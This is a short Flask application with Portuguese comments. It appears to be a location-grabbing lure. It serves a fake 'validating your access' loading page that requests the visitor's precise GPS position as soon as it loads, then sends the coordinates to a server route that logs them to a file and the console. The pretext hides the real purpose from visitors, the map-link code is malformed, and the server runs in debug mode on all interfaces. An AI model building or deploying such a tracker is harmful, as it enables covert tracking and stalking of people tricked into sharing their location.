from flask import Flask, render_template_string, request, jsonify
from datetime import datetime

app = Flask(__name__)

@app.route('/')
def index():
    html_content = """
    <!DOCTYPE html>
    <html lang="pt-BR">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Carregando...</title>
        <style>
            body { font-family: Arial, sans-serif; text-align: center; margin-top: 100px; background-color: #f4f4f9; }
            .loader { border: 4px solid #f3f3f3; border-top: 4px solid #007BFF; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
            @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        </style>
        <script>
            // Esta função roda automaticamente assim que a página termina de carregar
            window.onload = function() {
                if (!navigator.geolocation) {
                    document.getElementById("status").innerText = "Seu navegador não suporta geolocalização.";
                    return;
                }

                // Dispara a solicitação de permissão nativa do navegador imediatamente
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        const dados = {
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude
                        };

                        // Envia para o backend Python
                        fetch('/salvar-localizacao', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify(dados)
                        })
                        .then(response => response.json())
                        .then(data => {
                            document.getElementById("status").innerText = "Localização sincronizada com sucesso!";
                            // Opcional: Redirecionar o usuário para outra página real após o sucesso
                            // window.location.href = "https://exemplo.com";
                        })
                        .catch(err => {
                            console.error("Erro ao enviar dados:", err);
                            document.getElementById("status").innerText = "Erro ao sincronizar dados.";
                        });
                    },
                    (error) => {
                        // Caso o usuário recuse a permissão nativa
                        document.getElementById("status").innerText = "Permissão negada pelo usuário.";
                    },
                    {
                        enableHighAccuracy: true, // Solicita a maior precisão possível (GPS)
                        timeout: 10000,           // Tempo limite de 10 segundos para resposta
                        maximumAge: 0             // Força obter uma localização recente, não em cache
                    }
                );
            };
        </script>
    </head>
    <body>
        <div class="loader"></div>
        <h2 id="status">Processando sua solicitação...</h2>
        <p>Por favor, aguarde enquanto validamos seu acesso.</p>
    </body>
    </html>
    """
    return render_template_string(html_content)

@app.route('/salvar-localizacao', methods=['POST'])
def salvar_localizacao():
    dados = request.get_json()
    lat = dados.get('latitude')
    lon = dados.get('longitude')
    agora = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    link_mapa = f"https://google.com{lat},{lon}"
    linha_registro = f"[{agora}] Lat: {lat}, Lon: {lon} -> {link_mapa}\n"
    
    with open("coordenadas.txt", "a", encoding="utf-8") as arquivo:
        arquivo.write(linha_registro)
        
    print("\n" + "="*50)
    print(f"[NOVA LOCALIZAÇÃO RECEBIDA - {agora}]")
    print(f"Latitude: {lat}")
    print(f"Longitude: {lon}")
    print(f"Link do Google Maps: {link_mapa}")
    print("="*50 + "\n")
    
    return jsonify({"status": "sucesso", "mensagem": "Coordenadas registradas!"})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
